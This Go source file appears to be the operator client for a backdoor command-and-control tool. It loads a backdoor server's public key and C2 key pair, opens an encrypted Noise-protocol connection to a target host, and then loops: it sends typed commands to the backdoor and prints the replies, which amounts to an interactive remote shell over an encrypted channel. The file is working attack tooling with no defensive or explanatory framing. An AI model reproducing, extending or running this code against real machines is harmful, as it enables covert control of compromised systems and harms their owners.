package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/flynn/noise"
	"gopkg.in/noisesocket.v0"
	"io"
	"io/ioutil"
	"net/textproto"
	"os"
	"strings"
)

func main() {
	pubKey := flag.String("i", "", "Required backdoor server public key")
	c2Keys := flag.String("k", "", "Required C2 server keys (assumes the public key is appended with .pub)")
	flag.Parse()
	if *pubKey == "" {
		fmt.Fprintf(os.Stderr, os.Args[0]+": -i is a REQUIRED option\n")
		os.Exit(1)
	}
	if *c2Keys == "" {
		fmt.Fprintf(os.Stderr, os.Args[0]+": -k is a REQUIRED option\n")
		os.Exit(1)
	}
	p1, err := ioutil.ReadFile(*pubKey)
	if err != nil {
		fmt.Fprintf(os.Stderr, os.Args[0]+": could not read in server public key at "+*pubKey+"\n")
		os.Exit(2)
	}
	cpr1, err := ioutil.ReadFile(*c2Keys)
	if err != nil {
		fmt.Fprintf(os.Stderr, os.Args[0]+": could not read in private key at "+*c2Keys+"\n")
		os.Exit(2)
	}
	cp1, err := ioutil.ReadFile(*c2Keys + ".pub")
	if err != nil {
		fmt.Fprintf(os.Stderr, os.Args[0]+": could not read in public key at "+*c2Keys+".pub\n")
		os.Exit(2)
	}
	cliPub, _ := base64.StdEncoding.DecodeString((string)(cp1))
	cliPriv, _ := base64.StdEncoding.DecodeString((string)(cpr1))
	serverPub, _ := base64.StdEncoding.DecodeString((string)(p1))

	clientKeys := noise.DHKey{
		Public:  cliPub,
		Private: cliPriv,
	}

	conn, err := noisesocket.Dial(flag.Args()[0], &noisesocket.ConnectionConfig{
		StaticKey:  clientKeys,
		PeerStatic: serverPub,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, os.Args[0]+": could not parse "+flag.Args()[0]+": "+err.Error()+"\n")
		os.Exit(3)
	}
	writer := bufio.NewWriter(conn)
	uinput := bufio.NewReader(os.Stdin)
	tp := textproto.NewWriter(writer)
	for {
		text, _ := uinput.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		tp.PrintfLine(text)
		go func() {
			io.Copy(os.Stdout, conn)
		}()
	}
	return
}
